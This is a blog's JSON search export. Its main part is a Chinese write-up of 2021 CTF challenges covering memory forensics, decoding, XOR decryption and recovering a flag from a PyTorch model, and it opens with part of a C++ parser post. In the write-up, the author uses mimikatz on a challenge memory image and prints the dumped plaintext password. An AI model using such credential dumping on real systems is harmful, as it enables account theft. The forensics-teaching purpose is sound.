factor(); void match(char expectedToken) { if (token == expectedToken) token = getchar(); else printf(\u0026#34;error in match\\n\u0026#34;); } int main() { token = getchar(); Node* root = exp(); if (token == \u0026#39;\\n\u0026#39; || token == \u0026#39;\\r\u0026#39;) { printf(\u0026#34;success\\n\u0026#34;); printTree(root, 0, 0); } else { printf(\u0026#34;error in main\\n\u0026#34;); } destroy_node(root); return 0; } Node* exp() { Node* temp = term(); Node* newtemp = NULL; while (token == \u0026#39;+\u0026#39; || token == \u0026#39;-\u0026#39;) { newtemp = makeNode(string(1,token)); match(token); newtemp-\u0026gt;left = temp; newtemp-\u0026gt;right = term(); temp = newtemp; } return temp; } Node* term() { Node* temp = factor(); Node* newtemp = NULL; while (token == \u0026#39;*\u0026#39; || token == \u0026#39;/\u0026#39;) { newtemp = makeNode(string(1,token)); match(token); newtemp-\u0026gt;left = temp; newtemp-\u0026gt;right = factor(); temp = newtemp; } return temp; } Node* factor() { Node* temp = NULL; if (token == \u0026#39;(\u0026#39;) { match(\u0026#39;(\u0026#39;); temp = exp(); match(\u0026#39;)\u0026#39;); } else if (token \u0026gt;= \u0026#39;1\u0026#39; \u0026amp;\u0026amp; token \u0026lt;= \u0026#39;9\u0026#39;) { ungetc(token, stdin); int number; scanf(\u0026#34;%d\u0026#34;, \u0026amp;number); temp = makeNode(to_string(number)); token = getchar(); } else { printf(\u0026#34;error in factor\\n\u0026#34;); } return temp; } /*销毁树*/ void destroy_node(Node* node) { if (node != NULL) { destroy_node(node-\u0026gt;left); destroy_node(node-\u0026gt;right); cout \u0026lt;\u0026lt; node-\u0026gt;data; delete node; node = NULL; } } Node* makeNode(string value) { Node* node = new Node; // Node* node = (Node*)malloc(sizeof(Node));  node-\u0026gt;data = value; node-\u0026gt;left = NULL; node-\u0026gt;right = NULL; return node; } void printTree(Node* n, int type, int level) { int i; if (NULL == n) return; printTree(n-\u0026gt;right, 2, level + 1); switch (type) { case 0: printf(\u0026#34;%s\\n\u0026#34;, n-\u0026gt;data.c_str()); break; case 1: for (i = 0; i \u0026lt; level; i++) printf(\u0026#34;\\t\u0026#34;); printf(\u0026#34;\\\\%s\\n\u0026#34;, n-\u0026gt;data.c_str()); break; case 2: for (i = 0; i \u0026lt; level; i++) printf(\u0026#34;\\t\u0026#34;); printf(\u0026#34;/ %s\\n\u0026#34;, n-\u0026gt;data.c_str()); break; } printTree(n-\u0026gt;left, 1, level + 1); }   运行结果如下图所示\n","description":"","id":6,"section":"posts","tags":["course","compiler"],"title":"递归下降语法分析器的构建","uri":"https://ruokeqx.gitee.io/posts/recursive-descent-parser/"},{"content":"2021西湖论剑 Yusa的密码 一个镜像文件，一个加密压缩包\n题目有五个彩蛋\n1 2 3 4 5  egg1 yusa姐姐很担心比赛时平台卡得崩溃，为此彻夜难眠 egg2 yusa姐姐是尊贵的SVIP8，不会有人不知道叭 egg3 You still have lots more to work on... egg4 yusa姐姐有好多好多的小娇妻，渣男 egg5 yusa姐姐希望西湖论剑的flag格式为yusameinv{.*?}，但我就不^_^   直接mimikatz得到密码YusaYusa520\n1 2 3 4  Module User Domain Password -------- ---------------- ---------------- ---------------------------------------- wdigest Yusa YUSA-PC YusaYusa520 wdigest YUSA-PC$ WORKGROUP   解密压缩包得到Who_am_I文件，不知道是什么文件\nfilescan看到Sakura文件这个文件夹中有几个文件\n1 2 3 4 5 6  0x000000003e58ada0 1 0 R--r-- \\Device\\HarddiskVolume2\\Program Files\\MSBuild\\Microsoft\\Windows Workflow Foundation\\Sakura-didi 0x000000003e78c6a0 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakura文件\\Sakura-公告 0x000000003f2ae290 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakura文件\\Sakura-egg5 0x000000003f959980 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakura文件\\Sakura-备忘录 0x000000003faa3a20 2 0 RW-rw- \\Device\\HarddiskVolume2\\Users\\Yusa\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\Sakura文件.lnk 0x000000003fabc220 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakura文件\\Sakura-logo   其中Sakura-didi是一个加密了的zip文件，Sakura文件.lnk就是指向到桌面Sakura文件夹的link文件，Sakura-logo是一个樱花logo，Sakura-egg5是彩蛋，Sakura-公告文件内容为\n1  全体成员注意，我们将在11月20号，对地球发起总攻，请做好准备。   提示在Sakura-备忘录中\n1  2021.11.15：请组织内的人务必删除所有不必要的联系方式，防止我们的计划出现问题。   寻找联系方式\n两个文件Mystery Man.contact 和 Yusa.contact\n文件1\n文件可以用文本编辑器直接打开，是xml文本；也可以用Windows联系人打开，消息在备注里。\n1 2 3 4 5  LF2XGYPPXSGOPO4E465YPZMITLSYRGXGWS7OJOEL42O2LZFYQDSLRKXEXO56LCVB566IZ2FPW7S37K7HQK46LLUM42EJB354RTSL3IHFR6VONHEJ4S4ITZNEVHTJPNXJS62OHAECGZGCWWRVOBUXMNKMGJTTKTDZME2TKU3PGVMWS5ZVGVYUKYJSKY2TON3ZJU2VSK3WGVGHK3BVGVJW6NLBGZCDK33NKQ2WE6KBGU3XKRJVG52UQNJXOVNDKTBSM42TK4KFGVRGK3BVLFLTGNBUINBTKYTFNQ2VSVZTGVNEOOJVLJBU4NKMGZSDKNCXNY2UY4KHGVGHSZZVG52WMNSLMVCTKWLJLI2DIQ2DMEZFMNJXG54WCT2EJF3VSV2NGVGW2SJVLJVFKNCNKRIXSWLNJJUVS6SJGNMTERLZJ5KFM3KNK5HG2TSEM46Q==== # base32解密得到 Yusa，组织刚刚派下来一个任务，请快点完成，你只有三天时间。6L+Z5piv5L2g5Lya55So5Yiw55qEa2V577yM5Y+v5Lul55So5a6D5omT5byA57uE57uH57uZ5L2g55qE5bel5YW344CC5bel5YW35ZG95ZCN5L6d54Wn5LqG5Lyg57uf6KeE5YiZ44CCa2V577yaODIwYWM5MmI5ZjU4MTQyYmJiYzI3Y2EyOTVmMWNmNDg= # base64解密得到 这是你会用到的key，可以用它打开组织给你的工具。工具命名依照了传统规则。key：820ac92b9f58142bbbc27ca295f1cf48   用得到的key解密Sakura-didi.zip得到key.bmp文件，不知道是什么\n文件2\n同上，网站中是egg3，文本打开的话还有一串base，解密后是bmp图片，也就是Windows联系人的头像\n附注里面有一串字\n1  一位经常忘事，所以会把重要事情记录在便笺里的漂亮女孩   寻找便笺内容\n得到StickyNotes.snt，这是win7的存储便笺的文件，win7应该可以直接用便笺打开，win10好像不行\n直接010看内容，cyberchecf from hex + decode text得到如下内容\n1 2  \\\u0026#39;d6\\\u0026#39;d5\\\u0026#39;d3\\\u0026#39;da\\\u0026#39;c4\\\u0026#39;c3\\\u0026#39;b5\\\u0026#39;bd\\\u0026#39;c1\\\u0026#39;cb\\\u0026#39;d7\\\u0026#39;e9\\\u0026#39;d6\\\u0026#39;af\\\u0026#39;b5\\\u0026#39;c4\\\u0026#39;ba\\\u0026#39;cb\\\u0026#39;d0\\\u0026#39;c4\u0026#39;c3\\\u0026#39;dc\\\u0026#39;c2\\\u0026#39;eb\\\u0026#39;a3\\\u0026#39;ac\\\u0026#39;ce\\\u0026#39;d2\\\u0026#39;b2\\\u0026#39;bb\\\u0026#39;cf\\\u0026#39;eb\\\u0026#39;d4\\\u0026#39;d9\\\u0026#39;b5\\\u0026#39;b1\\\u0026#39;ce\\\u0026#39;d4\\\u0026#39;b5\\\u0026#39;d7\\\u0026#39;c1\\\u0026#39;cb\\\u0026#39;a3\\\u0026#39;ac\\\u0026#39;ce\\\u0026#39;d2\\\u0026#39;cf\\\u0026#39;eb\\\u0026#39;b8\\\u0026#39;cf\\\u0026#39;bd\\\u0026#39;f4\\\u0026#39;c0\\\u0026#39;eb\\\u0026#39;bf\\\u0026#39;aa\\\u0026#39;d5\\\u0026#39;e2\\\u0026#39;b8\\\u0026#39;f6\\\u0026#39;b9\\\u0026#39;ed\\\u0026#39;b5\\\u0026#39;d8\\\u0026#39;b7\\\u0026#39;bd\\\u0026#39;a1\\\u0026#39;a3\\\u0026#39;ba\\\u0026#39;cb\\\u0026#39;d0\\\u0026#39;c4\\\u0026#39;c3\\\u0026#39;dc\\\u0026#39;c2\\\u0026#39;eb\\\u0026#39;ca\\\u0026#39;c7\\\u0026#39;a3\\\u0026#39;ba\\\u0026#39;ca\\\u0026#39;c0\\\u0026#39;bd\\\u0026#39;e7\\\u0026#39;c3\\\u0026#39;bb\\\u0026#39;c1\\\u0026#39;cb\\\u0026#39;d0\\\u0026#39;c4\\\u0026#39;cc\\\u0026#39;f8\\\u0026#39;a1\\\u0026#39;a3\\ 终于拿到了组织的核心密码，我不想再当卧底了，我想赶紧离开这个鬼地方。核心密码是：世界没了心跳。   使用核心密码解密得到的key.zip文件，得到加密exp，是利用上面的key.bmp文件和flag得到Who_am_I的加密逻辑，就是很简单的异或。\n下方注释部分替换掉原来的就能解密得到flag文件，是一个gif\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  from PIL import Image import struct pic = Image.open(\u0026#39;key.bmp\u0026#39;) fp = open(\u0026#39;flag\u0026#39;, \u0026#39;rb\u0026#39;) fs = open(\u0026#39;Who_am_I\u0026#39;, \u0026#39;wb\u0026#39;) # fp = open(\u0026#39;flag\u0026#39;, \u0026#39;wb\u0026#39;) # fs = open(\u0026#39;Who_am_I\u0026#39;, \u0026#39;rb\u0026#39;) a, b = pic.size list1 = [] for y in range(b): for x in range(a): pixel = pic.getpixel((x, y)) list1.extend([pixel[1], pixel[0], pixel[2], pixel[2], pixel[1], pixel[0]]) data = fp.read() for i in range(0, len(data)): fs.write(struct.pack(\u0026#39;B\u0026#39;, data[i] ^ list1[i % a*b*6])) # data = fs.read() # for i in range(0, len(data)): # fp.write(struct.pack(\u0026#39;B\u0026#39;, data[i] ^ list1[i % a*b*6])) fp.close() fs.close()   直接stegsolve看Frame10得到flag\n1  DASCTF{c3837c61-77f1-413e-b2e6-3ccbc96df9f4}   彩蛋部分\n1：桌面有个新建文本文档.txt里面是egg1\n1  0x000000003e20d900 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\新建文本文档.txt   2：filedumps得到egg2，里面内容就是彩蛋\n1  0x000000003f82fdc0 1 0 R--r-- \\Device\\HarddiskVolume2\\Program Files\\Reference Assemblies\\Microsoft\\Framework\\egg2   3：Yusa.contact的网站部分\n1  egg3 You still have lots more to work on...   4：cmdscan得到egg4\n1 2  egg4 eXVzYeWnkOWnkOacieWlveWkmuWlveWkmueahOWwj+Woh+Wmu++8jOa4o+eUtw== # base解密得到：yusa姐姐有好多好多的小娇妻，渣男   5：screenshot 得到th1s_1s_3gg5_k3y\n用上面的密钥下面文件得到egg5\n1  0x000000003f2ae290 1 0 R--r-- \\Device\\HarddiskVolume2\\Users\\Yusa\\Desktop\\Sakura文件\\Sakura-egg5   2021L3HCTF DeepDarkFantasy 安装torch 刚好有CUDA 就想着跟着复现一遍\npth是torch模型文件 xor后获得正确的模型\n官网一条命令安装torch\n1  pip3 install torch==1.10.0+cu102 torchvision==0.11.1+cu102 torchaudio===0.10.0+cu102 -f https://download.pytorch.org/whl/cu102/torch_stable.html   前置知识 torch有两种模型保存方法\n 保存整个神经网络的结构信息和模型的参数信息 save对象是网络net  该方法保存的模型通过torch.load()直接初始化新的神经网络\n1 2 3 4  #保存模型 torch.save(model_object,\u0026#39;resnet.pth\u0026#39;) #加载模型 model=torch.load(\u0026#39;resnet.pth\u0026#39;)   只保存神经网络的训练模型参数 save对象是net.state_dict()  该方法保存的方式：首先导入对应的网络 再net.load_state_dict()完成模型参数的加载\n1 2 3 4 5  #将my_resnet模型存储为my_resnet.pth torch.save(my_resnet.state_dict(),\u0026#34;my_resnet.pth\u0026#34;) #加载resnet，模型存放在my_resnet.pth my_resnet.load_state_dict(torch.load(\u0026#34;my_resnet.pth\u0026#34;)) #其中my_resnet是my_resnet.pth对应的网络结构；   复现过程 0x01 先确定保存模型的方法 load(model)报错反序列化find_class出错，这个MyAutoEncoder就是他定义的类。\n那么就需要我们手动构建网络然后导入\n手动定义一个同名类后实例化load提示缺少Encoder\u0026amp;Decoder\n编写三个空类后可以成功load 看到保存的网络结构和训练好的参数\n至此我们可以确定保存的是第一种类型 即既保存网路模型又保存训练参数\n0x02 恢复网络结构 上面说到成功load model\n因为state_dict是具体参数我们可以暂时不管 直接print model查看网络结构\n1  print(ruokeqxmodel[\u0026#39;model\u0026#39;])   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  MyAutoEncoder( (encoder): Encoder( (conv): Sequential( (0): Conv2d(1, 16, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)) (1): ReLU() (2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) (3): Conv2d(16, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)) (4): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) (5): ReLU() (6): Conv2d(8, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)) (7): MaxPool2d(kernel_size=2, stride=2, padding=1, dilation=1, ceil_mode=False) (8): ReLU() (9): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False) (10): Flatten(start_dim=1, end_dim=-1) ) (fc): Linear(in_features=32, out_features=16, bias=True) ) (decoder): Decoder( (convt): Sequential( (0): ConvTranspose2d(1, 256, kernel_size=(1, 1), stride=(1, 1)) (1): ReLU() (2): ConvTranspose2d(256, 256, kernel_size=(1, 1), stride=(1, 1)) (3): ReLU() (4): ConvTranspose2d(256, 512, kernel_size=(1, 1), stride=(1, 1)) (5): ReLU() (6): ConvTranspose2d(512, 128, kernel_size=(4, 4), stride=(4, 4)) (7): ReLU() (8): ConvTranspose2d(128, 64, kernel_size=(4, 4), stride=(4, 4)) (9): ReLU() (10): ConvTranspose2d(64, 32, kernel_size=(2, 2), stride=(2, 2)) (11): ReLU() (12): ConvTranspose2d(32, 1, kernel_size=(2, 2), stride=(2, 2)) (13): Sigmoid() ) ) )   接下来照抄恢复网络结构\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  class Encoder(Module): def __init__(self): super().__init__() self.conv = Sequential( Conv2d(1, 16, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)), ReLU(), MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False), Conv2d(16, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)), MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False), ReLU(), Conv2d(8, 8, kernel_size=(3, 3), stride=(2, 2), padding=(1, 1)), MaxPool2d(kernel_size=2, stride=2, padding=1, dilation=1, ceil_mode=False), ReLU(), MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False), Flatten(start_dim=1, end_dim=-1) ) self.fc = Linear(in_features=32, out_features=16, bias=True) def forward(self, t): t = self.conv(t) t = self.fc(t) return t class Decoder(Module): def __init__(self): super().__init__() self.convt = Sequential( ConvTranspose2d(1, 256, kernel_size=(1, 1), stride=(1, 1)), ReLU(), ConvTranspose2d(256, 256, kernel_size=(1, 1), stride=(1, 1)), ReLU(), ConvTranspose2d(256, 512, kernel_size=(1, 1), stride=(1, 1)), ReLU(), ConvTranspose2d(512, 128, kernel_size=(4, 4), stride=(4, 4)), ReLU(), ConvTranspose2d(128, 64, kernel_size=(4, 4), stride=(4, 4)), ReLU(), ConvTranspose2d(64, 32, kernel_size=(2, 2), stride=(2, 2)), ReLU(), ConvTranspose2d(32, 1, kernel_size=(2, 2), stride=(2, 2)), Sigmoid() ) def forward(self, t): t = self.convt(t) return t class MyAutoEncoder(Module): def __init__(self): super().__init__() # self.encoder = Encoder() # self.decoder = Decoder() def forward(self, t): t = self.encoder.forward(t) t = self.decoder.forward(t) return t   再接下来我们可以实例化一个自己的网络然后用load_state_dict 把刚才说的model里训练好的参数读出来\n0x03 fuzz and solve 导入参数后，随便输入一个张量decode\nConv2d输入参数为四维数据，如果不是4维的会报错提示要输入4-dimensional\n生成一个随机的四维张量输入 可以看到输出隐约有L3字样\n1 2 3 4 5 6  toPIL = transforms.ToPILImage() data = torch.randn(1, 1, 1, 1) print(data) # tensor([[[[1.7006]]]]) pics = ruokeqxmodel.forward(data)[0] pic = toPIL(pics) pic.save(\u0026#39;./flag.jpg\u0026#39;)   再生成一个四维[1,1,4,4]16个随机数，可以看到不同随机数下输出不同字样，爆破即可\n生成正负20个数 发现正的部分到12就不变然后很清晰 负的到19还不是很清晰\n设置offset -5 然后生成数增加到正负30\n可以看到到-22基本不变，+14基本不变，最终offset就定-4，step1太大了，所以step0.1，range180\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  modelname = \u0026#34;./decrypted.pth\u0026#34; ruokeqxmodel = MyAutoEncoder() ruokeqxmodel.load_state_dict(torch.load(modelname)[\u0026#39;state_dict\u0026#39;]) offset = -4 for i in range(180): trans = transforms.ToPILImage() pl = [[[[offset + 0.1 * i]]]] nl = [[[[offset - 0.1 * i]]]] pdata = torch.tensor(pl) ndata = torch.tensor(nl) ppic = ruokeqxmodel.forward(pdata)[0] npic = ruokeqxmodel.forward(ndata)[0] pic = toPIL(ppic[0]) pic.save(\u0026#39;./flag/flag\u0026#39; + str(10*offset + i) + \u0026#39;.png\u0026#39;) pic = trans(npic[0]) pic.save(\u0026#39;./flag/flag\u0026#39; + str(10*offset - i) + \u0026#39;.png\u0026#39;)   拼图得到flag\n1  L3HCTF{blackbinarysencoder0xb1a876a}   2021CISCN初赛 稍微做了一点misc 带躺还得看队友\ntiny traffic http看到get了flag相关东西\nflag_wrapper gzip解密得到flag头 CISCN{}\npython br解密test得到proto\nsyntax = \u0026quot;proto3\u0026quot;;\rmessage PBResponse {\rint32 code = 1;\rint64 flag_part_convert_to_hex_plz = 2;\rmessage data {\rstring junk_data = 2;\rstring flag_part = 1;\r}\rrepeated data dataList = 3;\rint32 flag_part_plz_convert_to_hex = 4;\rstring flag_last_part = 5;\r}\rmessage PBRequest {\rstring cate_id = 1;\rint32 page = 2;\rint32 pageSize = 3;\r}\rhttps://www.buymeacoffee.com/marcgravell\n用他的在线工具生成py(好像是这个的作者)\n1 2  # 打印一下得到flag hex(proto.flag_part_convert_to_hex_plz)[2:] + proto.dataList[0].flag_part + proto.dataList[1].flag_part + hex(proto.flag_part_plz_convert_to_hex)[2:] + proto.flag_last_part   running_pixel 抽帧看了一眼大概是每十帧一重复 看了一眼像素每张两个像素不一样 循环输出点发现位置不一样但很近 画出来看了一眼是字符 那就全画出来就是flag了\n1 2 3 4 5 6 7 8 9 10  from PIL import Image flag=[(231, 114), (325, 171), (231, 115), (326, 171), (231, 116), (327, 171), (232, 114), (328, 171), (233, 114), (329, 171), (233, 115), (229, 114), (233, 116), (229, 115), (36, 242), (229, 116), (36, 243), (230, 116), (36, 244), (231, 114), (37, 242), (231, 115), (38, 242), (231, 116), (38, 243), (232, 114), (38, 244), (233, 114), (39, 244), (233, 115), (40, 242), (233, 116), (40, 243), (36, 242), (40, 244), (36, 243), (36, 244), (306, 256), (37, 242), (306, 257), (38, 242), (306, 258), (38, 243), (307, 256), (38, 244), (307, 258), (39, 244), (308, 256), (40, 242), (308, 258), (40, 243), (309, 256), (40, 244), (309, 258), (310, 256), (306, 256), (310, 257), (306, 257), (310, 258), (306, 258), (307, 256), (359, 145), (307, 258), (359, 147), (308, 256), (360, 145), (308, 258), (360, 147), (309, 256), (361, 145), (309, 258), (361, 146), (310, 256), (361, 147), (310, 257), (362, 147), (310, 258), (363, 147), (152, 101), (359, 145), (152, 102), (359, 147), (153, 101), (360, 145), (153, 103), (360, 147), (154, 101), (361, 145), (154, 103), (361, 146), (155, 101), (361, 147), (155, 103), (362, 147), (156, 101), (363, 147), (156, 102), (152, 101), (152, 102), (360, 225), (153, 101), (360, 226), (153, 103), (360, 227), (154, 101), (361, 225), (154, 103), (361, 227), (155, 101), (362, 225), (155, 103), (362, 227), (156, 101), (363, 225), (156, 102), (363, 227), (364, 225), (360, 225), (364, 226), (360, 226), (364, 227), (360, 227), (235, 383), (361, 225), (235, 384), (361, 227), (235, 385), (362, 225), (236, 383), (362, 227), (237, 383), (363, 225), (237, 384), (363, 227), (237, 385), (364, 225), (238, 383), (364, 226), (239, 383), (364, 227), (32, 197), (235, 383), (32, 198), (235, 384), (32, 199), (235, 385), (236, 383), (237, 383), (278, 35), (237, 384), (278, 36), (237, 385), (278, 37), (238, 383), (279, 35), (239, 383), (279, 37), (280, 35), (32, 197), (280, 36), (32, 198), (280, 37), (32, 199), (281, 37), (282, 35), (278, 35), (282, 36), (278, 36), (282, 37), (278, 37), (174, 295), (279, 35), (174, 296), (279, 37), (175, 295), (280, 35), (175, 297), (280, 36), (176, 295), (280, 37), (176, 297), (281, 37), (177, 295), (282, 35), (177, 297), (282, 36), (178, 295), (282, 37), (178, 296), (174, 295), (167, 231), (174, 296), (167, 232), (175, 295), (167, 233), (175, 297), (168, 231), (176, 295), (169, 231), (176, 297), (169, 232), (177, 295), (169, 233), (177, 297), (170, 231), (178, 295), (171, 231), (178, 296), (171, 232), (167, 231), (171, 233), (167, 232), (167, 233), (249, 356), (168, 231), (250, 356), (169, 231), (251, 356), (169, 232), (252, 356), (169, 233), (253, 356), (170, 231), (171, 231), (342, 340), (171, 232), (342, 341), (171, 233), (342, 342), (243, 65), (249, 356), (243, 67), (250, 356), (244, 65), (251, 356), (244, 67), (252, 356), (245, 65), (253, 356), (245, 66), (245, 67), (342, 340), (246, 67), (342, 341), (247, 67), (342, 342), (117, 346), (243, 65), (117, 347), (243, 67), (118, 346), (244, 65), (118, 348), (244, 67), (119, 346), (245, 65), (119, 347), (245, 66), (120, 346), (245, 67), (120, 348), (246, 67), (121, 346), (247, 67), (121, 347), (117, 346), (67, 229), (117, 347), (67, 230), (118, 346), (67, 231), (118, 348), (68, 229), (119, 346), (68, 231), (119, 347), (69, 229), (120, 346), (69, 231), (120, 348), (70, 229), (121, 346), (70, 231), (121, 347), (71, 229), (67, 229), (71, 230), (67, 230), (71, 231), (67, 231), (39, 278), (68, 229), (39, 279), (68, 231), (39, 280), (69, 229), (40, 278), (69, 231), (40, 280), (70, 229), (41, 278), (70, 231), (41, 280), (71, 229), (42, 278), (71, 230), (42, 280), (71, 231), (43, 278), (39, 278), (43, 279), (39, 279), (43, 280), (39, 280), (40, 278), (279, 14), (40, 280), (279, 15), (41, 278), (279, 16), (41, 280), (42, 278), (264, 374), (42, 280), (264, 375), (43, 278), (264, 376), (43, 279), (265, 374), (43, 280), (265, 376), (266, 374), (266, 375), (279, 14), (266, 376), (279, 15), (267, 374), (279, 16), (267, 376), (264, 374), (268, 374), (264, 375), (268, 375), (264, 376), (268, 376), (265, 374), (70, 52), (265, 376), (70, 53), (266, 374), (70, 54), (266, 375), (71, 54), (266, 376), (72, 54), (267, 374), (73, 54), (267, 376), (74, 54), (268, 374), (268, 375), (228, 63), (268, 376), (229, 62), (70, 52), (229, 64), (70, 53), (230, 62), (70, 54), (230, 63), (71, 54), (230, 64), (72, 54), (231, 62), (73, 54), (231, 64), (74, 54), (232, 62), (232, 64), (228, 63), (229, 62), (321, 163), (229, 64), (321, 164), (230, 62), (321, 165), (230, 63), (322, 163), (230, 64), (323, 163), (231, 62), (323, 164), (231, 64), (323, 165), (232, 62), (324, 165), (232, 64), (325, 163), (325, 164), (321, 163), (325, 165), (321, 164), (289, 238), (321, 165), (289, 239), (322, 163), (289, 240), (323, 163), (323, 164), (161, 296), (323, 165), (162, 295), (324, 165), (162, 297), (325, 163), (163, 295), (325, 164), (163, 296), (325, 165), (163, 297), (164, 295), (289, 238), (164, 297), (289, 239), (165, 295), (289, 240), (165, 297), (161, 296), (72, 134), (162, 295), (72, 135), (162, 297), (72, 136), (163, 295), (73, 134), (163, 296), (74, 134), (163, 297), (74, 135), (164, 295), (74, 136), (164, 297), (75, 136), (165, 295), (76, 134), (165, 297), (76, 135), (72, 134), (76, 136), (72, 135), (72, 136), (165, 344), (73, 134), (165, 345), (74, 134), (165, 346), (74, 135), (166, 344), (74, 136), (167, 344), (75, 136), (167, 345), (76, 134), (167, 346), (76, 135), (168, 344), (76, 136), (169, 344), (165, 344), (310, 124), (165, 345), (310, 125), (165, 346), (311, 124), (166, 344), (311, 126), (167, 344), (312, 124), (167, 345), (312, 126), (167, 346), (313, 124), (168, 344), (313, 126), (169, 344), (314, 124), (314, 125), (310, 124), (310, 125), (357, 246), (311, 124), (357, 247), (311, 126), (358, 246), (312, 124), (358, 248), (312, 126), (359, 246), (313, 124), (359, 248), (313, 126), (360, 246), (314, 124), (360, 248), (314, 125), (361, 246), (361, 247), (357, 246), (14, 124), (357, 247), (14, 125), (358, 246), (14, 126), (358, 248), (15, 124), (359, 246), (15, 126), (359, 248), (16, 124), (360, 246), (16, 126), (360, 248), (17, 124), (361, 246), (17, 126), (361, 247), (18, 124), (14, 124), (18, 125), (14, 125), (18, 126), (14, 126), (15, 124), (386, 92), (15, 126), (386, 93), (16, 124), (386, 94), (16, 126), (387, 92), (17, 124), (387, 94), (17, 126), (388, 92), (18, 124), (388, 93), (18, 125), (388, 94), (18, 126), (389, 94), (390, 92), (386, 92), (390, 93), (386, 93), (390, 94), (386, 94), (315, 190), (387, 92), (315, 191), (387, 94), (315, 192), (388, 92), (316, 190), (388, 93), (316, 192), (388, 94), (317, 190), (389, 94), (317, 191), (390, 92), (317, 192), (390, 93), (318, 190), (390, 94), (318, 192), (315, 190), (319, 190), (315, 191), (319, 191), (315, 192), (319, 192), (316, 190), (231, 95), (316, 192), (231, 96), (317, 190), (231, 97), (317, 191), (232, 95), (317, 192), (233, 95), (318, 190), (233, 96), (318, 192), (233, 97), (319, 190), (234, 95), (319, 191), (234, 97), (319, 192), (235, 95), (231, 95), (235, 96), (231, 96), (235, 97), (231, 97), (232, 95), (337, 78), (233, 95), (338, 77), (233, 96), (338, 79), (233, 97), (339, 77), (234, 95), (339, 78), (234, 97), (339, 79), (235, 95), (340, 77), (235, 96), (340, 79), (235, 97), (341, 77), (341, 79), (337, 78), (338, 77), (379, 59), (338, 79), (379, 60), (339, 77), (379, 61), (339, 78), (380, 59), (339, 79), (380, 61), (340, 77), (381, 59), (340, 79), (381, 61), (341, 77), (382, 59), (341, 79), (382, 61), (383, 59), (379, 59), (383, 60), (379, 60), (383, 61), (379, 61), (122, 204), (380, 59), (122, 205), (380, 61), (122, 206), (381, 59), (123, 204), (381, 61), (123, 206), (382, 59), (124, 204), (382, 61), (124, 206), (383, 59), (125, 204), (383, 60), (125, 206), (383, 61), (126, 204), (122, 204), (126, 205), (122, 205), (126, 206), (122, 206)] pic = Image.new(\u0026#34;RGB\u0026#34;,(400,400)) i=0 for pix in flag: i=i+1 x=pix[1] y=pix[0] pic.putpixel((x,y),(255,255,255)) pic.save(f\u0026#39;{i:05d}.png\u0026#39;)   隔空传话 找到一个在线工具\nhttps://tool.letmetellyou.xyz/pdu/\n直接解，然后合并一下 搜常见文件头看到8950 看到时间戳是乱的 想到排序后组合图片万能excel排个序\n写个脚本恢复文件\n1 2 3 4 5 6 7 8 9 10 11  str = \u0026#34;\u0026#34; data = open(\u0026#39;data.txt\u0026#39;,\u0026#39;w\u0026#39;) with open(\u0026#39;op.csv\u0026#39;,\u0026#39;r\u0026#39;,newline=\u0026#39;\u0026#39;)as f: lines = f.readlines() for line in lines: temp = line.split(\u0026#39;,\u0026#39;)[1].split(\u0026#39;\\r\\n\u0026#39;)[0] # print(temp) str += temp data.write(str) data.close()   合并一下第一部分的提示就是flag\nthe first part of the flag is the first 8 digits of your phone number\nDESTINATION ADDRESS: +8615030442000\nrobot 根据题目描述猜测可能跟位置或者路径有关，查看流量搜pos可以发现很多坐标导出pos\n1  strings cap.pcapng | grep \u0026#34;Value\u0026#34; -A 1 | grep \u0026#34;\\[\u0026#34; | grep \u0026#34;\\]\u0026#34; \u0026gt; pos.txt   去掉了括号 刚开始想用scatter画但是不知道为啥画出来很奇怪 换成画图片就行了\n1 2 3 4 5 6 7 8 9 10  from PIL import Image from hashlib import md5 pic = Image.new(\u0026#34;RGB\u0026#34;,(400,400)) with open(\u0026#39;pos.txt\u0026#39;,\u0026#39;r\u0026#39;) as f: lines = f.readlines() for line in lines: pic.putpixel( (int(line.split(\u0026#39;,\u0026#39;)[0]),int(line.split(\u0026#39;,\u0026#39;)[1])) ,(255,255,255)) pic.show() pic.save(\u0026#39;./pic.png\u0026#39;) print(md5(b\u0026#39;easy_robo_xx\u0026#39;).hexdigest())   ","description":"","id":7,"section":"posts","tags":["CTF","WP"],"title":"2021CTF WP","uri":"https://ruokeqx.gitee.io/posts/2021wp/"},{"content":"懒狗学不动了\nTags  Currently a student in ZSTU. A member of Nepnep. Really want a girl friend.  Awards    Game Name Time     🥉\u0026quot;软银机器人杯\u0026quot;2019年中国机器人技能大赛三等奖 Nanjing,China,Dec,2019   🥉中国高校计算机大赛2020网络技术挑战赛华东赛区三等奖 Online,Aug,2020   🏆浙江省第三届大学生网络与信息安全竞赛决赛一等奖 Zhejiang,China,Sep,2020   🏆第十三届全国大学生信息安全竞赛——创新实践能力赛华东南赛区特等奖 Online,Sep,2020   🥉第十三届全国大学生信息安全竞赛——创新实践能力赛总决赛三等奖 Wuhan,China,Sep,2020   